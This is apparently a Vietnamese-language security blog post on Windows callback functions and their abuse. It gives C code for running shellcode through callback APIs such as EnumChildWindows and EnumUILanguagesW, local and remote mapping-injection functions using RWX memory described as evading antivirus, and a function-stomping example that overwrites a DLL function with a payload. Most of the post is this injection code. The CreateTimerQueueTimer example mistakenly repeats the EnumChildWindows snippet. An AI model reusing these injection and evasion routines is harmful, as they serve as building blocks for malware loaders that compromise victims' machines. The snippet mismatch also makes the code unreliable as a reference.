---
title: "Windows Internals: A Look at Callback Functions"
published: 2023-07-09
description: ""
image: ""
tags:
  - "windows"
category: "Cybersecurity"
draft: false 
lang: "en"
---

Callback functions là một khái niệm quan trọng trong nội bộ Windows, thường được sử dụng để xử lý các sự kiện hoặc thực thi hành động khi một điều kiện nhất định được đáp ứng. Các hàm này là công cụ mạnh mẽ trong các thao tác ở cấp hệ thống và cũng có thể bị lạm dụng cho mục đích xấu. Trong bài viết này, chúng ta sẽ tìm hiểu cách callback functions hoạt động, cách chúng có thể bị lợi dụng, và giới thiệu các kỹ thuật như mapping injection và function stomping.
### **Callback Function là gì?**

**Callback function** là một hàm được truyền vào như một đối số của một hàm khác, với mục đích được gọi lại sau này khi một điều kiện hoặc sự kiện nhất định xảy ra. Các hàm này rất hữu ích trong việc quản lý các thao tác bất đồng bộ hoặc lập trình theo sự kiện. Ví dụ, **callback** có thể được sử dụng để xử lý các sự kiện hệ thống, xử lý thông điệp hoặc quản lý các tác vụ bất đồng bộ.
### **Tận dụng Callback Functions**
Mặc dù callback functions là phần không thể thiếu trong hoạt động bình thường của chương trình, nhưng chúng cũng có thể bị lợi dụng để thực thi mã độc. Thay vì sử dụng các phương pháp truyền thống như `CreateThread` hoặc các kỹ thuật liên quan đến luồng khác, callback functions có thể được sử dụng để kích hoạt việc thực thi mã độc. Điều này đặc biệt nguy hiểm vì callback functions thường xuyên xuất hiện trong nhiều thao tác hệ thống, mở ra cơ hội cho kẻ tấn công lợi dụng.
Sau đây chúng ta sẽ tìm hiểu vài api phổ biến có tính năng **callback**.
#### **Sử Dụng `CreateTimerQueueTimer`**
Hàm `CreateTimerQueueTimer` tạo một bộ đếm thời gian và thêm nó vào hàng đợi thời gian của hệ thống. Khi bộ đếm thời gian hết hạn, nó sẽ gọi callback function. Bằng cách thiết lập callback function để thực thi payload, kẻ tấn công có thể kích hoạt việc chạy mã độc.
Dưới đây là cấu trúc cơ bản của `CreateTimerQueueTimer`:

```c
BOOL CreateTimerQueueTimer(
  [out]          PHANDLE             phNewTimer,
  [in, optional] HANDLE              TimerQueue,
  [in]           WAITORTIMERCALLBACK Callback,      // đây
  [in, optional] PVOID               Parameter,
  [in]           DWORD               DueTime,
  [in]           DWORD               Period,
  [in]           ULONG               Flags
);
```

Ví dụ sử dụng để thực thi payload:

```c
if (!EnumChildWindows(NULL, (WNDENUMPROC)Payload, NULL)) {
    printf("[!] EnumChildWindows Failed With Error : %d \n", GetLastError());
    return -1;
}
```

#### **Sử Dụng `EnumChildWindows`**

Hàm `EnumChildWindows` cho phép ứng dụng liệt kê tất cả các cửa sổ con của một cửa sổ cha được chỉ định. Hàm này áp dụng callback function vào mỗi cửa sổ con. Bằng cách thiết lập callback để thực thi payload, mã độc có thể được chạy cho mỗi cửa sổ.

```c
BOOL EnumChildWindows(
  [in, optional] HWND        hWndParent,
  [in]           WNDENUMPROC lpEnumFunc,    // đây
  [in]           LPARAM      lParam
);
```

Ví dụ:

```c
if (!EnumChildWindows(NULL, (WNDENUMPROC)Payload, NULL)) {
    printf("[!] EnumChildWindows Failed With Error : %d \n", GetLastError());
    return -1;
}
```

#### **Sử Dụng `EnumUILanguagesW`**

Hàm `EnumUILanguagesW` được sử dụng để liệt kê tất cả các ngôn ngữ giao diện người dùng đã cài đặt trên hệ thống, gọi callback function cho mỗi ngôn ngữ. Hàm này cũng có thể bị lợi dụng bằng cách thiết lập callback để thực thi payload.

```c
BOOL EnumUILanguagesW(
  [in] UILANGUAGE_ENUMPROCW lpUILanguageEnumProc,     // đây
  [in] DWORD                dwFlags,
  [in] LONG_PTR             lParam
);
```

Ví dụ sử dụng:

```c
if (!EnumUILanguagesW((UILANGUAGE_ENUMPROCW)Payload, MUI_LANGUAGE_NAME, NULL)) {
    printf("[!] EnumUILanguagesW Failed With Error : %d \n", GetLastError());
    return -1;
}
```

#### **Sử Dụng `VerifierEnumerateResource`**

Hàm `VerifierEnumerateResource` được sử dụng để liệt kê các tài nguyên trong một module. Khi bị lạm dụng, nó có thể được khai thác để chạy một payload. Hàm này yêu cầu module phải được tải với `LoadLibrary` và `GetProcAddress`, và cho phép bạn kiểm tra tài nguyên heap.

Ví dụ:

```c
HMODULE hModule = NULL;
fnVerifierEnumerateResource pVerifierEnumerateResource = NULL;

hModule = LoadLibraryA("verifier.dll");
if (hModule == NULL) {
    printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
    return -1;
}

pVerifierEnumerateResource = GetProcAddress(hModule, "VerifierEnumerateResource");
if (pVerifierEnumerateResource == NULL) {
    printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
    return -1;
}

// Chạy payload bằng cách thiết lập cờ AvrfResourceHeapAllocation
pVerifierEnumerateResource(GetCurrentProcess(), NULL, AvrfResourceHeapAllocation, (AVRF_RESOURCE_ENUMERATE_CALLBACK)Payload, NULL);
```
### **Mapping Injection**

Mapping injection là một kỹ thuật mà trong đó bộ nhớ được ánh xạ vào không gian địa chỉ của một process. Kỹ thuật này ít bị phát hiện hơn so với các phương pháp cấp phát bộ nhớ truyền thống, chẳng hạn như `VirtualAlloc`, vì chúng dễ bị phần mềm diệt virus theo dõi.

#### **Mapping Injection Nội Bộ**

Dưới đây là cách bạn có thể tiêm một payload vào bộ nhớ sử dụng `CreateFileMapping` và `MapViewOfFile`:

```c
BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {
    BOOL bSTATE = TRUE;
    HANDLE hFile = NULL;
    PVOID pMapAddress = NULL;

    // Tạo file mapping với quyền RWX
    hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
    if (hFile == NULL) {
        printf("[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Ánh xạ payload vào bộ nhớ
    pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
    if (pMapAddress == NULL) {
        printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Sao chép payload vào bộ nhớ đã ánh xạ
    memcpy(pMapAddress, pPayload, sPayloadSize);

_EndOfFunction:
    *ppAddress = pMapAddress;
    if (hFile)
        CloseHandle(hFile);
    return bSTATE;
}
```
#### **Remote Mapping Injection**

Đối với việc tiêm từ xa, quá trình tương tự, nhưng bạn sẽ ánh xạ bộ nhớ vào không gian địa chỉ của remote process.

```c
BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {
    BOOL bSTATE = TRUE;
    HANDLE hFile = NULL;
    PVOID pMapLocalAddress = NULL, pMapRemoteAddress = NULL;

    // Tạo file mapping
    hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
    if (hFile == NULL) {
        printf("[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Ánh xạ bộ nhớ cục bộ và sao chép payload
    pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
    if (pMapLocalAddress == NULL) {
        printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }
    memcpy(pMapLocalAddress, pPayload, sPayloadSize);

    // Ánh xạ payload vào không gian địa chỉ của tiến trình từ xa
    pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
    if (pMapRemoteAddress == NULL) {
        printf("[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);

_EndOfFunction:
    *ppAddress = pMapRemoteAddress;
    if (hFile)
        CloseHandle(hFile);
    return bSTATE;
}
```
### **Function Stomping Injection**

Function stomping là một kỹ thuật trong đó bộ nhớ của một hàm hoặc cấu trúc dữ liệu bị ghi đè bằng dữ liệu mới. Kỹ thuật này có thể được sử dụng để tiêm payload vào một tiến trình bằng cách trực tiếp thay đổi các địa chỉ hàm.

#### **Chèn DLL vào Binary**

Thay vì sử dụng `LoadLibrary` và `GetProcAddress`, bạn có thể liên kết tĩnh một DLL vào binary của bạn và chèn một payload vào trong đó.

```c
#pragma comment (lib, "Setupapi.lib") // Thêm "setupapi.dll" vào Import Address Table
```

```c
int main() {
    HANDLE hThread = NULL;
    printf("[+] Address Of \"SetupScanFileQueueA\" : 0x%p \n", &SetupScanFileQueueA);

    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();

    if (!WritePayload(&SetupScanFileQueueA, Payload, sizeof(Payload))) {
        return -1;
    }

    printf("[+] DONE \n");

    printf("[#] Press <Enter> To Run The Payload ... ");
    getchar();

    hThread = CreateThread(NULL, NULL, SetupScanFileQueueA, NULL, NULL, NULL);
    if (hThread != NULL)
        WaitForSingleObject(hThread, INFINITE);

    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}
```
### Kết Luận

Trong bài viết này, chúng ta đã khám phá cách mà callback functions hoạt động trong nội bộ Windows và cách chúng có thể bị lạm dụng để thực thi payload. Chúng ta cũng đã thảo luận các kỹ thuật như mapping injection và function stomping, là các phương pháp mà kẻ tấn công có thể sử dụng để tiêm payload vào tiến trình từ xa hoặc cục bộ.